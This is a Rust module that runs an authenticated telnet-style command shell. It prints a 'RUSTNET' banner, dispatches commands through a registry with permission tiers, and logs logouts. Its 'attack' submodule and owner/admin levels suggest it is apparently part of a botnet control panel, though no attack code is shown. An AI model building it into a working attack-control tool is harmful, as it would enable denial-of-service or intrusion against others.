pub mod ui;
pub mod general;
pub mod admin;
pub mod owner;
pub mod attack;
pub mod registry;
pub mod impls;

use std::sync::Arc;
use crate::modules::client_manager::Client;
use crate::modules::state::AppState;
use crate::modules::error::{Result, AuditLog, log_audit_event};
use crate::modules::commands::general::show_prompt;

use self::ui::*;
use self::registry::CommandRegistry;

pub async fn handle_authenticated_user(client: Arc<Client>, state: Arc<AppState>, registry: &CommandRegistry) -> Result<()> {
    // Initial clear and banner
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
    
    // Send welcome banner
    let banner = r#"
    ██████╗ ██╗   ██╗███████╗████████╗███╗   ██╗███████╗████████╗
    ██╔══██╗██║   ██║██╔════╝╚══██╔══╝████╗  ██║██╔════╝╚══██╔══╝
    ██████╔╝██║   ██║███████╗   ██║   ██╔██╗ ██║█████╗     ██║   
    ██╔══██╗██║   ██║╚════██║   ██║   ██║╚██╗██║██╔══╝     ██║   
    ██║  ██║╚██████╔╝███████║   ██║   ██║ ╚████║███████╗   ██║   
    ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═══╝╚══════╝   ╚═╝   
    "#;
    
    let gradient_banner = apply_ice_gradient(banner);
    client.write(format!("{}\n\r", gradient_banner).as_bytes()).await?;
    
    // Show initial prompt
    show_prompt(&client, &state).await?;

    loop {
        match client.read_line().await {
            Ok(line) => {
                let input = line.trim();
                if input.is_empty() {
                    show_prompt(&client, &state).await?;
                    continue;
                }

                let parts: Vec<&str> = input.split_whitespace().collect();
                let command_name = parts[0].to_lowercase();

                if let Some(cmd) = registry.get(&command_name) {
                    if client.has_permission(cmd.required_level()) {
                        if let Err(e) = cmd.execute(&client, &state, parts).await {
                            client.write(format!("\x1b[38;5;196m[X] Error: {}\n\r", e).as_bytes()).await?;
                        }
                    } else {
                        client.write(b"\x1b[38;5;196m[X] Permission denied\n\r").await?;
                    }
                } else {
                    client.write(format!("\x1b[38;5;196m[X] Unknown command: {}\n\r", command_name).as_bytes()).await?;
                }

                show_prompt(&client, &state).await?;
            }
            Err(_) => break,
        }
    }

    // Log logout
    let audit_event = AuditLog::new(client.user.username.clone(), "LOGOUT".to_string(), "SUCCESS".to_string());
    let _ = log_audit_event(audit_event, &state.pool).await;

    Ok(())
}
